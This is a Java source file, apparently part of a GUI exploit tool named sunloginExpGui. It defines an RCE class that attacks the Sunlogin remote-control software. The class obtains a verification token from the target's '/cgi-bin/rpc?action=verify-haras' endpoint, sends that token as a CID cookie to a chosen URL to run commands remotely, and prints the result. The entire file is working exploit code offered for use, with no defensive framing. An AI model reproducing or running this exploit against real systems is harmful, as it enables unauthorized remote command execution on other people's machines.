package sunloginExpGui.exploit;

import com.github.kevinsawicki.http.HttpRequest;

import sunloginExpGui.mainJFrame.SunloginExpGui;

public class RCE {
	
	String url;
	int httpTimeout;
	
	public RCE(String url,int httpTimeout) {
		this.url = url;
		this.httpTimeout = httpTimeout;
	}
	
	public String rce_by_check_api() {
		
		String cid = "";
		
		GetSunloginInfo.verifyString = SunloginExpGui.verifyStringField.getText().trim();
		
		if(GetSunloginInfo.verifyString.isEmpty()) {
			System.out.println("verifyString is null,get it first!");
			SunloginExpGui.expResultTextArea.append("verifyString is null, now try to get it first......\n");
			SunloginExpGui.expResultTextArea.selectAll();
			String getVerifyStringUrl = "http://" + url.split("http://")[1].split("/")[0] + "/cgi-bin/rpc?action=verify-haras";
			GetSunloginInfo gsli = new GetSunloginInfo(getVerifyStringUrl,httpTimeout);
			cid = gsli.get_verify_string();
			
		}
		else {
			
			cid = GetSunloginInfo.verifyString;
		}
		
		System.out.println("cid is " + cid);
		SunloginExpGui.expResultTextArea.append("cid is " + cid + "\n");
		SunloginExpGui.expResultTextArea.selectAll();
		
		String responseBody = "";
		
		try {
			HttpRequest responseRst = HttpRequest.get(url).header("Cookie", "CID="+cid).connectTimeout(httpTimeout).readTimeout(httpTimeout);
			responseBody = responseRst.body();
			
		} catch (Exception e) {
			// TODO: handle exception
			SunloginExpGui.expResultTextArea.append("rce_by_check_api attack failed. Caused exception.\n");
		}
		
		
		return responseBody;
		
	}
}
